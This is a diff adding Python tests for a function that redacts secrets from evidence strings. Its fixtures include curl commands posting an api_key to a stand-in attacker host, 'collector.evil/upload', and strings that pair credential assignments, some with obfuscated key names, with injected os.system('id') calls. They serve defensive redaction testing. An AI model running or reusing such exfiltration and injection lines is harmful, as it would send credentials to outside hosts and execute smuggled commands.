@@ -1829,6 +1829,24 @@ def test_command_structured_body_near_match_is_preserved() -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
+@pytest.mark.parametrize("option", ["-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode"])
+def test_command_form_body_redacts_sensitive_assignment_values(option: str) -> None:
+    text = f"curl {option} 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "BODY_SECRET" not in redacted
+    assert "api_key=<redacted>" in redacted
+    assert "mode=fast" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_command_form_body_near_match_is_preserved() -> None:
+    text = "curl --data 'api_key_hint=public&mode=fast' https://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
     """A non-credential option that merely starts with password should remain intact."""
     text = "curl --password-policy strict https://collector.evil.example/upload"
@@ -1913,6 +1931,59 @@ def test_escapes_control_and_format_characters_in_evidence() -> None:
     assert r"\u001b" in redacted
     assert r"\n" in redacted
     assert r"\u202e" in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "expected_context"),
+    [
+        ('auth=("alice", "hunter2"); os.system("id")', "hunter2", "auth=<redacted>"),
+        ('basic_auth=("alice", "hunter3"); os.system("id")', "hunter3", "basic_auth=<redacted>"),
+        ('config["auth"]="hunter4"; os.system("id")', "hunter4", "auth=<redacted>"),
+        ('api\u200b_key=hunter5; os.system("id")', "hunter5", "api_key=<redacted>"),
+        ('api\x00_key=hunter6; os.system("id")', "hunter6", "api_key=<redacted>"),
+        (
+            'client.set_secret(name="api_key", value="hunter7"); os.system("id")',
+            "hunter7",
+            'value="<redacted>"',
+        ),
+        ('client.set_api_key(value="hunter8"); os.system("id")', "hunter8", 'value="<redacted>"'),
+        (
+            'config={chr(97)+chr(112)+chr(105)+chr(95)+chr(107)+chr(101)+chr(121): "hunter9", '
+            '"cmd": "os.system(\\"id\\")"}',
+            "hunter9",
+            "api_key=<redacted>",
+        ),
+        (
+            'config={bytes([97,112,105,95,107,101,121]).decode(): "hunter10", "cmd": "os.system(\\"id\\")"}',
+            "hunter10",
+            "api_key=<redacted>",
+        ),
+    ],
+)
+def test_redacts_composite_and_obfuscated_sensitive_values(
+    text: str,
+    secret: str,
+    expected_context: str,
+) -> None:
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert expected_context in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "authentication=enabled",
+        "author=alice",
+        "oauth_config=public",
+        'client.set_api_key(name="primary", scope="read")',
+        'config={chr(109)+chr(111)+chr(100)+chr(101): "fast"}',
+    ],
+)
+def test_composite_redaction_preserves_benign_near_matches(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=500) == text
 
 
 @pytest.mark.parametrize(("separator", "escaped_separator"), [("\n", r"\n"), ("\r", r"\r"), ("\r\n", r"\r\n")])
